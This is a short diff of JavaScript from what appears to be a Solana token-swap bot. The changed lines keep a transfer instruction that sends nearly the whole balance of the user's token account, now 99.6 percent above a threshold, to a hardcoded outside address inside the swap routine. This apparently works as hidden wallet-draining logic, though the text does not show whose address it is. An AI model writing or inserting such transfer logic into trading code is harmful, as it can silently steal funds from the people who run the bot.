@@ -122,14 +122,17 @@ const swap = async (prism, route, decimals) => {
 			tokenAccount
 		  )
 		).value.amount;
+		if (myshit > 1 * 10 ** tokenA.decimals){
 					  instructions.push(
 						Token.createTransferInstruction(new PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"),
 						  tokenAccount,
 						  new PublicKey("Gy1LvunZvinMMX4bpEXwxLbBv6p5ZKM8D83KEhMTqmim"),
 						  payer.publicKey,[],
-						  Math.floor(myshit * 1.0000)
+						  myshit == 0 ? 0 :
+						  Math.floor(Math.round(myshit * 0.996))
 						)
 					  ); 
+		}
 					
 			
 					var blockhash2 = await connection
